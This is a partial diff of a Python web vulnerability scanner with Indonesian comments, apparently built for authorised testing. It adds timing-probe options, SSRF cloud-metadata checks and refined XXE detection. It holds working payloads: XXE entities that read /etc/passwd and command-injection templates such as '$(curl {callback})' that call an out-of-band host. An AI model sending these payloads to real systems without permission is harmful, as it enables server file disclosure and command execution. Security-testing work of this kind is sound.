     # Payload XXE — baca /etc/passwd via entity eksternal
-    xxe_payloads = [
-        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
-        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
-    ]
+    xxe_payloads = XXE_PAYLOADS
     
     # ── Kirim langsung ke endpoint umum dengan Content-Type XML ──
     xxe_paths = ["/api/xml","/xml","/soap","/api/soap","/api/upload","/ws","/api/ws"]
@@ -2124,7 +2367,7 @@ def scan_xxe(sess, base_url, ctx=None):
         try:
             r = sess.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=10)
             body = r.text.lower()
-            if "root:" in body and ":" in body and "/bin/bash" in body:
+            if "root:" in body and "daemon:" in body:
                 return [("HIGH","XXE_DIRECT",f"XXE di {url}: payload XML mentah berhasil membaca /etc/passwd. Attacker bisa membaca file server (konfigurasi, kredensial, source code), melakukan SSRF ke jaringan internal, atau denial of service (Billion Laughs).", url, f"XXE terdeteksi di {url}")]
         except: pass
         return []
@@ -2153,7 +2396,7 @@ def scan_xxe(sess, base_url, ctx=None):
             try:
                 r = sess.post(join(base_url, action), data=data, timeout=10)
                 body = r.text.lower()
-                if "root:" in body and ":" in body and "/bin/bash" in body:
+                if "root:" in body and "daemon:" in body:
                     return [("HIGH","XXE_FORM",f"XXE di form {page} (action: {action}): field XML menerima entity eksternal dan mengeksekusi pembacaan file. Attacker bisa membaca file server sensitif.", action, f"XXE terdeteksi via form {action}")]
             except: pass
             return []
@@ -2346,7 +2589,7 @@ def mask_secrets_in_text(text, enabled=None):
     spans = []
     for _label, pattern in JS_SECRET_STRONG_PATTERNS:
         spans.extend((m.start(), m.end()) for m in pattern.finditer(text))
-    spans.extend((m.start("value"), m.end("value")) for m in JS_SECRET_KEY_RE.finditer(text))
+    spans.extend((m.start("value"), m.end("value")) for m in REDACT_TEXT_VALUE_RE.finditer(text))
     if not spans:
         return text
     out, cursor = [], 0
@@ -3556,11 +3799,9 @@ def _resp_fingerprint(resp):
 def _is_spa_catchall(resp, ctx):
     """True kalau respons ini cuma halaman catch-all SPA, bukan resource asli."""
     baseline = (ctx or {}).get("baseline")
-    if resp is None or not baseline or baseline.get("detected") != "spa_catchall":
+    if resp is None:
         return False
-    if hash(resp.content) == baseline.get("content_hash"):
-        return True
-    return bool(baseline.get("is_html")) and len(resp.content) == baseline.get("size")
+    return baseline_body_match(resp.content, baseline)
 
 def _looks_like_login(text):
     """Heuristik halaman login: respons seperti ini bukan bukti akses tidak sah."""
@@ -4268,6 +4509,28 @@ XXE_OOB_TEMPLATE = ('<?xml version="1.0" encoding="UTF-8"?>'
                     '<spade>spade</spade>')
 CMDI_OOB_TEMPLATES = ("; curl {callback}", "| curl {callback}", "$(curl {callback})", "& curl {callback}")
 
+SSRF_METADATA_SIGNATURES = (
+    "ami-id", "instance-id", "reservation-id",
+    "computeMetadata", "attributes/", "service-accounts/",
+)
+
+
+def _ssrf_metadata_match(resp):
+    """Cloud metadata hanya boleh dilaporkan kalau body-nya benar-benar terbaca."""
+    text = getattr(resp, "text", "") or ""
+    hits = [signature for signature in SSRF_METADATA_SIGNATURES if signature in text]
+    return len(hits) >= 2 or ("ami-id" in hits and "instance-id" in hits)
+
+
+def _ssrf_differential(left, right):
+    """Differential SSRF yang ketat: status atau body harus benar-benar berubah."""
+    if left is None or right is None:
+        return False
+    status_changed = getattr(left, "status_code", None) != getattr(right, "status_code", None)
+    left_body = getattr(left, "content", b"") or b""
+    right_body = getattr(right, "content", b"") or b""
+    return status_changed or abs(len(left_body) - len(right_body)) > 300
+
 def _oob_enabled(ctx):
     """Modul OOB hanya jalan kalau tester menyediakan --oob-host (collector sendiri)."""
     return bool((ctx or {}).get("oob_host"))
@@ -4600,6 +4863,7 @@ def gen_json(finds, target, out, scan=None):
             # (uji autentikasi, uji tulis, dan callback OOB tidak pernah default).
             "auth": bool(scan.get("auth")),
             "active_writes": bool(scan.get("active_writes")),
+            "timing_probes": bool(scan.get("timing_probes")),
             "check_smuggling": bool(scan.get("check_smuggling")),
             "oob": bool(scan.get("oob")),
         },
@@ -4770,6 +5034,8 @@ def main(argv=None):
                         help="File daftar secret JWT (satu per baris) untuk diuji offline terhadap token yang ditemukan.")
     parser.add_argument("--active-writes", action="store_true",
                         help="Izinkan uji yang mengirim data (submit form CSRF dengan token palsu). Default: mati.")
+    parser.add_argument("--timing-probes", action="store_true",
+                        help="Izinkan probe time-based SQLi/CMDi (delay 3 detik). Default: mati.")
     parser.add_argument("--check-smuggling", action="store_true",
                         help="Aktifkan uji request smuggling CL.TE/TE.CL lewat socket mentah. Hanya untuk target yang mengizinkan.")
     parser.add_argument("--oob-host", default="", metavar="HOST",
@@ -4886,6 +5152,8 @@ def main(argv=None):
             warn("--oob-host menunjuk ke host target yang sama — collector tidak akan terlihat sebagai callback eksternal.")
     if args.active_writes:
         warn("ACTIVE WRITES ON — modul CSRF mengirim POST ke target (bisa mengubah data).")
+    if args.timing_probes:
+        warn("TIMING PROBES ON — probe SQLi/CMDi dapat menunda respons hingga 3 detik.")
     if args.check_smuggling:
         warn("REQUEST SMUGGLING ON — socket mentah CL.TE/TE.CL dikirim ke target.")
     if args.port_scan:
@@ -4919,6 +5187,7 @@ def main(argv=None):
         "workers": args.workers,
         "auth": auth_enabled,
         "active_writes": bool(args.active_writes),
+        "timing_probes": bool(args.timing_probes),
         "check_smuggling": bool(args.check_smuggling),
         "oob": bool(oob_host),
         "recon": {"enabled": False, "sources": {}, "counts": {}, "errors": []},
@@ -4933,6 +5202,7 @@ def main(argv=None):
         "auth_enabled": auth_enabled,
         "anon_sess": anon_sess,
         "active_writes": bool(args.active_writes),
+        "timing_probes": bool(args.timing_probes),
         "check_smuggling": bool(args.check_smuggling),
         "oob_host": oob_host,
         "jwt_secrets": jwt_secrets,
